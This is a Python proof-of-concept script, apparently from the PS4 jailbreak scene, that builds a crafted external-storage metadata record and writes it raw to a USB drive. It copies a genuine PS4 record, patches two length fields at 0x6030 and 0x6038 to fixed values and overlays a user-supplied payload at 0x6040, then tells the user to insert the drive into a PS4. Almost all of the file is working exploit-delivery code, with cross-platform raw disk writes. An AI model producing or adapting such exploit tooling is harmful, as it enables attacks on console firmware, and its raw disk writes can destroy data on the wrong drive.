#!/usr/bin/env python3
"""
a shitshow, the ps4 scene is.

    python poc.py --diagnose --disk 1
        Read the drive at 0x6000 and report what is actually there.
        No writes. Run this first.

    python poc.py --disk 1 --payload payload.bin --force
        Write the crafted record. Requires --force.

    python poc.py --payload payload.bin --no-write
        Merge only; produce merged_poc.bin.

    python poc.py --list
        Enumerate disks.
"""

import os, sys, json, struct, platform, subprocess, argparse
from pathlib import Path
from typing import Optional

LABEL      = b"PS4 External Storage Metadata R\x00"
LABEL_OFF  = 0x6000
VER_OFF    = 0x6024
LEN_A_OFF  = 0x6030
LEN_B_OFF  = 0x6038
BODY_OFF   = 0x6040
SECTOR     = 512

LEN_A_GOOD = 0x000000E86A034000
LEN_B_GOOD = 0x000000E86A00E000

IS_WIN = platform.system() == "Windows"
IS_LIN = platform.system() == "Linux"
IS_MAC = platform.system() == "Darwin"
HERE   = Path(__file__).resolve().parent

# ---------------------------------------------------------------- raw I/O

if IS_WIN:
    import ctypes
    from ctypes import wintypes
    _k32 = ctypes.WinDLL("kernel32", use_last_error=True)
    _k32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD,
        ctypes.c_void_p, wintypes.DWORD, wintypes.DWORD, ctypes.c_void_p]
    _k32.CreateFileW.restype  = wintypes.HANDLE
    _k32.SetFilePointerEx.argtypes = [wintypes.HANDLE, ctypes.c_longlong,
        ctypes.POINTER(ctypes.c_longlong), wintypes.DWORD]
    _k32.SetFilePointerEx.restype  = wintypes.BOOL
    _k32.ReadFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    _k32.ReadFile.restype  = wintypes.BOOL
    _k32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD,
        ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
    _k32.WriteFile.restype  = wintypes.BOOL
    _k32.CloseHandle.argtypes = [wintypes.HANDLE]
    _k32.CloseHandle.restype  = wintypes.BOOL

    _GR, _GW        = 0x80000000, 0x40000000
    _OPEN_EXISTING  = 3
    _SHARE_RW       = 3
    _INVALID_HANDLE = (1 << (8 * ctypes.sizeof(ctypes.c_void_p))) - 1

    def _open(path: str, write: bool):
        acc = _GR | (_GW if write else 0)
        h = _k32.CreateFileW(path, acc, _SHARE_RW, None, _OPEN_EXISTING, 0, None)
        if not h or h.value == _INVALID_HANDLE:
            err = ctypes.get_last_error()
            raise OSError(f"CreateFile {path}: Win32 error {err} "
                          f"(run elevated, close HxD and Disk Management)")
        return h

    def _seek(h, off: int):
        np = ctypes.c_longlong(0)
        if not _k32.SetFilePointerEx(h, ctypes.c_longlong(off),
                                     ctypes.byref(np), 0):
            raise OSError(f"SetFilePointerEx {off:#x}: "
                          f"Win32 error {ctypes.get_last_error()}")

    def _read(h, off: int, n: int) -> bytes:
        _seek(h, off)
        buf = ctypes.create_string_buffer(n)
        got = wintypes.DWORD(0)
        if not _k32.ReadFile(h, buf, n, ctypes.byref(got), None):
            raise OSError(f"ReadFile {off:#x}: "
                          f"Win32 error {ctypes.get_last_error()}")
        return buf.raw[:got.value]

    def _write(h, off: int, data: bytes):
        if len(data) % SECTOR:
            raise ValueError(f"unaligned write ({len(data)} bytes)")
        _seek(h, off)
        buf = ctypes.create_string_buffer(data, len(data))
        got = wintypes.DWORD(0)
        if not _k32.WriteFile(h, buf, len(data), ctypes.byref(got), None):
            raise OSError(f"WriteFile {off:#x}: "
                          f"Win32 error {ctypes.get_last_error()}")
        if got.value != len(data):
            raise OSError(f"short write at {off:#x}: "
                          f"{got.value}/{len(data)}")

    def _close(h):
        _k32.CloseHandle(h)

    def devpath(n): return rf"\\.\PhysicalDrive{n}"

    def list_disks():
        ps = ("Get-CimInstance Win32_DiskDrive | Select-Object "
              "Index,Model,Size,InterfaceType,MediaType | "
              "ConvertTo-Json -Compress -Depth 3")
        try:
            out = subprocess.run(["powershell","-NoProfile","-Command",ps],
                                 capture_output=True, text=True, timeout=15).stdout
            d = json.loads(out.strip() or "[]")
            if isinstance(d, dict): d = [d]
            return [{"index": int(x.get("Index", -1)),
                     "model": str(x.get("Model","")),
                     "size":  int(x.get("Size",0) or 0),
                     "iface": str(x.get("InterfaceType","") or ""),
                     "media": str(x.get("MediaType","") or "")}
                    for x in d]
        except Exception:
            return []

    def dismount(n: int):
        ps = (f"$ErrorActionPreference='SilentlyContinue';"
              f"Get-Partition -DiskNumber {n} | "
              f"Where-Object {{$_.DriveLetter}} | "
              f"ForEach-Object {{ mountvol ($_.DriveLetter + ':') /p }}")
        subprocess.run(["powershell","-NoProfile","-Command",ps],
                       capture_output=True, timeout=15)

    def is_system_disk(n: int) -> bool:
        ps = (f"$s = (Get-Partition -DiskNumber {n} -ErrorAction SilentlyContinue | "
              f"Where-Object {{$_.DriveLetter -eq 'C'}}); "
              f"if ($s) {{ '1' }} else {{ '0' }}")
        try:
            out = subprocess.run(["powershell","-NoProfile","-Command",ps],
                                 capture_output=True, text=True, timeout=10).stdout
            return out.strip() == "1"
        except Exception:
            return True   # fail safe

else:
    import fcntl

    def _open(path: str, write: bool):
        try:
            return os.open(path, os.O_RDWR if write else os.O_RDONLY)
        except PermissionError:
            raise OSError(f"open {path}: permission denied (run as root)")

    def _seek(fd, off: int):
        os.lseek(fd, off, os.SEEK_SET)

    def _read(fd, off: int, n: int) -> bytes:
        _seek(fd, off)
        d = b""
        while len(d) < n:
            c = os.read(fd, n - len(d))
            if not c:
                break
            d += c
        if len(d) != n:
            raise OSError(f"short read at {off:#x}: {len(d)}/{n}")
        return d

    def _write(fd, off: int, data: bytes):
        if len(data) % SECTOR:
            raise ValueError(f"unaligned write ({len(data)} bytes)")
        _seek(fd, off)
        w = 0
        while w < len(data):
            w += os.write(fd, data[w:])
        if w != len(data):
            raise OSError(f"short write at {off:#x}: {w}/{len(data)}")

    def _close(fd):
        try: os.close(fd)
        except Exception: pass

    def devpath(n: int) -> str:
        return f"/dev/sd{chr(ord('a')+n)}"

    def list_disks():
        out = []
        if not IS_LIN:
            return out
        try:
            r = subprocess.run(["lsblk","-J","-b","-o",
                                "NAME,TYPE,SIZE,MODEL,RM,TRAN,MOUNTPOINTS"],
                               capture_output=True, text=True, timeout=10).stdout
            for d in json.loads(r).get("blockdevices", []):
                if d.get("type") != "disk":
                    continue
                out.append({
                    "index": len(out),
                    "model": (d.get("model") or "").strip(),
                    "size":  int(d.get("size") or 0),
                    "iface": (d.get("tran") or "").upper(),
                    "media": "Removable" if str(d.get("rm")) == "1" else "Fixed",
                    "path":  f"/dev/{d['name']}",
                    "mount": d.get("mountpoints") or [],
                })
        except Exception:
            pass
        return out

    def dismount(n: int):
        try:
            r = subprocess.run(["lsblk","-J","-b","-o","NAME,TYPE,MOUNTPOINTS"],
                               capture_output=True, text=True, timeout=5).stdout
            name = f"sd{chr(ord('a')+n)}"
            for d in json.loads(r).get("blockdevices", []):
                if d.get("name") != name:
                    continue
                for child in d.get("children", []):
                    mp = child.get("mountpoints") or []
                    for m in mp:
                        if m:
                            subprocess.run(["umount", m],
                                           capture_output=True, timeout=5)
        except Exception:
            pass

    def is_system_disk(n: int) -> bool:
        try:
            r = subprocess.run(["lsblk","-J","-b","-o","NAME,TYPE,MOUNTPOINTS"],
                               capture_output=True, text=True, timeout=5).stdout
            name = f"sd{chr(ord('a')+n)}"
            for d in json.loads(r).get("blockdevices", []):
                if d.get("name") != name:
                    continue
                for child in d.get("children", []):
                    for m in child.get("mountpoints") or []:
                        if m == "/":
                            return True
        except Exception:
            return True
        return False


# ---------------------------------------------------------------- helpers

def find_file(name: str, explicit: Optional[str] = None) -> Optional[Path]:
    if explicit:
        p = Path(explicit)
        if p.exists():
            return p
        raise SystemExit(f"missing: {explicit}")
    for cand in [HERE / name, Path.cwd() / name]:
        if cand.exists():
            return cand
    return None


def parse_hex_dump(data: bytes, base: int = 0, width: int = 16) -> str:
    out = []
    for i in range(0, len(data), width):
        chunk = data[i:i+width]
        hexs = " ".join(f"{b:02x}" for b in chunk)
        text = "".join(chr(b) if 32 <= b < 127 else "." for b in chunk)
        out.append(f"  {base+i:08x}  {hexs:<48}  {text}")
    return "\n".join(out)


# ---------------------------------------------------------------- diagnose

def diagnose(disk_index: int) -> int:
    if is_system_disk(disk_index):
        print(f"refusing: disk {disk_index} hosts the system volume")
        return 2
    path = devpath(disk_index)
    print(f"diagnosing {path}")
    try:
        h = _open(path, False)
    except OSError as e:
        print(f"  cannot open: {e}")
        return 1
    try:
        # Read the record window header
        head = _read(h, LABEL_OFF, 0x100)
        print(f"  bytes at 0x{LABEL_OFF:X} (256):")
        print(parse_hex_dump(head, base=LABEL_OFF))

        # Check for the label
        if head.startswith(LABEL):
            print(f"  label: PRESENT at 0x{LABEL_OFF:X}")
        else:
            idx = head.find(LABEL)
            if idx >= 0:
                print(f"  label: found at 0x{LABEL_OFF+idx:X} "
                      f"(expected 0x{LABEL_OFF:X})")
            else:
                # Search the first 64 KB
                window = _read(h, 0, 0x10000)
                idx = window.find(LABEL[:16])
                if idx >= 0:
                    print(f"  label: found at 0x{idx:X} in first 64 KB")
                else:
                    print("  label: NOT FOUND in first 64 KB")
                    print("  -> this drive does not have the metadata record")
                    print("  -> format it as extended storage on a PS4 first")

        # Version
        ver = _read(h, VER_OFF, 4)
        print(f"  version at 0x{VER_OFF:X}: {ver.hex()}  "
              f"({struct.unpack('<I', ver)[0]})")

        # Length fields
        a = struct.unpack("<Q", _read(h, LEN_A_OFF, 8))[0]
        b = struct.unpack("<Q", _read(h, LEN_B_OFF, 8))[0]
        print(f"  len_a  at 0x{LEN_A_OFF:X}: {a:#018x}")
        print(f"  len_b  at 0x{LEN_B_OFF:X}: {b:#018x}")
        print(f"  expected a: {LEN_A_GOOD:#018x}")
        print(f"  expected b: {LEN_B_GOOD:#018x}")

        # Body preview
        body = _read(h, BODY_OFF, 0x80)
        print(f"  body at 0x{BODY_OFF:X} (128):")
        print(parse_hex_dump(body, base=BODY_OFF))

        return 0
    finally:
        _close(h)


# ---------------------------------------------------------------- merge

def build_record(payload: bytes, base: Optional[bytes]) -> bytes:
    """
    Compose the crafted record.
    - base must be a genuine PS4-written record (jm_real.bin) with the
      label present. Without base, this function refuses.
    - payload is overlaid at BODY_OFF.
    - len fields are patched to LEN_A_GOOD / LEN_B_GOOD.
    """
    if base is None:
        raise SystemExit("base record (jm_real.bin) required; "
                         "refusing to synthesize")
    if base[LABEL_OFF:LABEL_OFF+len(LABEL)] != LABEL:
        raise SystemExit(f"base has no PS4 label at 0x{LABEL_OFF:X}")

    size = max(len(base), BODY_OFF + len(payload))
    size = (size + SECTOR - 1) // SECTOR * SECTOR
    img = bytearray(size)
    img[:len(base)] = base

    struct.pack_into("<Q", img, LEN_A_OFF, LEN_A_GOOD)
    struct.pack_into("<Q", img, LEN_B_OFF, LEN_B_GOOD)

    n = min(len(img) - BODY_OFF, len(payload))
    img[BODY_OFF:BODY_OFF+n] = payload[:n]
    return bytes(img)


# ---------------------------------------------------------------- write

def write_record(disk_index: int, img: bytes):
    if is_system_disk(disk_index):
        raise SystemExit(f"refusing: disk {disk_index} hosts the system volume")
    path = devpath(disk_index)
    print(f"target : {path}")
    print(f"image  : {len(img):,} bytes ({len(img)/1024/1024:.2f} MB)")
    print("dismounting volumes...")
    dismount(disk_index)

    h = _open(path, True)
    try:
        saved_mbr = None
        try:
            saved_mbr = _read(h, 0, SECTOR)
            print(f"saved MBR sig {saved_mbr[510]:02x} {saved_mbr[511]:02x}")
        except OSError as e:
            print(f"WARN: MBR readback failed: {e}")

        chunk = 1 << 20
        w = 0
        total = len(img)
        while w < total:
            n = min(chunk, total - w)
            if n % SECTOR:
                n = ((n + SECTOR - 1) // SECTOR) * SECTOR
                if w + n > total:
                    n = total - w
            _write(h, w, img[w:w+n])
            w += n
            pct = (w * 100) // total
            print(f"  {pct:3d}%  {w:,}/{total:,}")

        if saved_mbr is not None:
            _write(h, 0, saved_mbr)
            print("MBR restored")
    finally:
        _close(h)

    print("verifying...")
    h = _open(path, False)
    try:
        lab = _read(h, LABEL_OFF, len(LABEL) + 4)
        a   = struct.unpack("<Q", _read(h, LEN_A_OFF, 8))[0]
        b   = struct.unpack("<Q", _read(h, LEN_B_OFF, 8))[0]
        ok_lab = lab.startswith(LABEL)
        ok_a   = (a == LEN_A_GOOD)
        ok_b   = (b == LEN_B_GOOD)
        print(f"  label  {'OK' if ok_lab else 'MISSING'}")
        print(f"  len_a  {'OK' if ok_a else 'MISMATCH'}  {a:#018x}")
        print(f"  len_b  {'OK' if ok_b else 'MISMATCH'}  {b:#018x}")
        sample = _read(h, BODY_OFF, 32)
        print(f"  body+0 {sample.hex()}")
        return ok_lab and ok_a and ok_b
    finally:
        _close(h)


# ---------------------------------------------------------------- main

def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--payload", default=None)
    ap.add_argument("--base",    default=None)
    ap.add_argument("--disk",    type=int, default=None)
    ap.add_argument("--out",     default="merged_poc.bin")
    ap.add_argument("--no-write", action="store_true")
    ap.add_argument("--diagnose", action="store_true")
    ap.add_argument("--list",     action="store_true")
    ap.add_argument("--force",    action="store_true")
    args = ap.parse_args()

    disks = list_disks()
    if args.list:
        for d in disks:
            gb = d.get("size", 0) / (1024**3)
            print(f"[{d['index']:>2}]  {gb:8.2f} GB  "
                  f"{d.get('iface',''):<6}  {d.get('media',''):<12}  "
                  f"{d.get('path', devpath(d['index']))}  {d.get('model','')}")
        return

    if args.diagnose:
        if args.disk is None:
            sys.exit("--diagnose requires --disk N")
        sys.exit(diagnose(args.disk))

    if not args.no_write and not args.force:
        sys.exit("refusing to write without --force "
                 "(run --diagnose first)")

    payload_path = find_file("payload.bin", args.payload)
    if payload_path is None:
        sys.exit("payload.bin not found next to poc.py or in cwd")
    payload = payload_path.read_bytes()
    print(f"payload : {payload_path} ({len(payload):,} bytes)")

    base_path = find_file("jm_real.bin", args.base)
    if base_path is None:
        sys.exit("jm_real.bin required (real PS4-formatted record). "
                 "Run --diagnose to check your drive first.")
    base = base_path.read_bytes()
    print(f"base    : {base_path} ({len(base):,} bytes)")

    img = build_record(payload, base)
    Path(args.out).write_bytes(img)
    print(f"merged  : {args.out} ({len(img):,} bytes)")

    if args.no_write:
        return

    disk = args.disk
    if disk is None:
        cand = [d for d in disks
                if "USB" in d.get("iface","").upper()
                or d.get("media","").lower().startswith("remov")]
        if not cand:
            sys.exit("no removable disk found; pass --disk N")
        disk = cand[0]["index"]
        print(f"auto-picked disk {disk}: {cand[0].get('model','')} "
              f"({cand[0].get('size',0)/1024**3:.2f} GB)")

    write_record(disk, img)
    print()
    print("done. eject, insert into PS4, tap 'Use This Extended Storage'.")


if __name__ == "__main__":
    main()